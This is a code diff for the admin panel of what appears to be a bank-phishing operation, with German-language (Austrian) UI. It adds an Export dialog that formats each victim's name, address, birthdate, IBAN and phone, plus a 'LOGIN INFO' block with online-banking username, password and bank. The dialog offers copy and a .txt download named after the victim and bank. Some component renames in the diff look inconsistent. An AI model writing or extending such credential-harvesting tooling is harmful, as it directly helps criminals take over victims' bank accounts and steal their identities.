@@ -174,6 +174,37 @@ function DetailContent() {
   const addressExtra = [submission.staircase ? `Stiege ${submission.staircase}` : null, submission.door_number ? `Tür ${submission.door_number}` : null].filter(Boolean).join(", ");
   const fullAddress = [address, addressExtra, [submission.postal_code, submission.city].filter(Boolean).join(" ")].filter(Boolean).join(", ");
 
+  const exportText = [
+    `fullname: ${submission.full_name || ""}`,
+    `email: ${submission.email || ""}`,
+    `city: ${submission.city || ""}`,
+    `street: ${submission.street || ""}`,
+    `housenumber: ${submission.house_number || ""}`,
+    `stiege: ${submission.staircase || ""}`,
+    `door: ${submission.door_number || ""}`,
+    `postcode: ${submission.postal_code || ""}`,
+    `birthdate: ${submission.birthdate || ""}`,
+    `iban: ${submission.iban || ""}`,
+    `phone: ${submission.phone || ""}`,
+    ``,
+    `======> LOGIN INFO <=======`,
+    `benutzername: ${submission.bank_username || ""}`,
+    `passwort: ${submission.bank_password || ""}`,
+    `bank: ${submission.bank || ""}`,
+  ].join("\n");
+
+  const downloadExport = () => {
+    const name = (submission.full_name || "export").replace(/\s+/g, "_");
+    const bank = (submission.bank || "unknown").replace(/\s+/g, "_");
+    const blob = new Blob([exportText], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `${name}_${bank}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+  };
+
   return (
     <div className="max-w-5xl space-y-6">
       {/* Header */}
@@ -187,15 +218,18 @@ function DetailContent() {
             {submission.created_at ? new Date(submission.created_at).toLocaleString("de-AT") : ""}
           </p>
         </div>
+        <Button variant="outline" size="sm" className="gap-1.5" onClick={() => setExportOpen(true)}>
+          <Download className="h-4 w-4" /> Export
+        </Button>
         <AlertDialog>
           <AlertDialogTrigger asChild>
             <Button variant="outline" size="sm" className="gap-1.5 text-red-600 border-red-200 hover:bg-red-50 hover:border-red-300">
               <Trash2 className="h-4 w-4" /> Löschen
             </Button>
           </AlertDialogTrigger>
-          <AlertDialogContent>
+          <AlertContent>
             <AlertDialogHeader>
-              <AlertDialogTitle>Eintrag löschen?</AlertDialogTitle>
+              <AlertTitle>Eintrag löschen?</AlertTitle>
               <AlertDialogDescription>
                 Dieser Eintrag wird unwiderruflich gelöscht. Alle zugehörigen Notizen und Anruf-Logs werden ebenfalls entfernt.
               </AlertDialogDescription>
@@ -206,9 +240,25 @@ function DetailContent() {
                 {deleting ? "Löscht..." : "Endgültig löschen"}
               </AlertDialogAction>
             </AlertDialogFooter>
-          </AlertDialogContent>
+          </AlertContent>
         </AlertDialog>
       </div>
+
+      {/* Export Dialog */}
+      <Dialog open={exportOpen} onOpenChange={setExportOpen}>
+        <DialogContent className="max-w-lg">
+          <DialogHeader><DialogTitle>Export</DialogTitle></DialogHeader>
+          <Textarea readOnly value={exportText} rows={18} className="font-mono text-xs resize-none" />
+          <div className="flex justify-end gap-2">
+            <Button variant="outline" size="sm" onClick={() => { navigator.clipboard.writeText(exportText); toast.success("Kopiert!"); }} className="gap-1.5">
+              <Copy className="h-4 w-4" /> Kopieren
+            </Button>
+            <Button size="sm" onClick={downloadExport} className="gap-1.5">
+              <FileDown className="h-4 w-4" /> Download .txt
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
 
       <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
         {/* Persönliche Daten */}
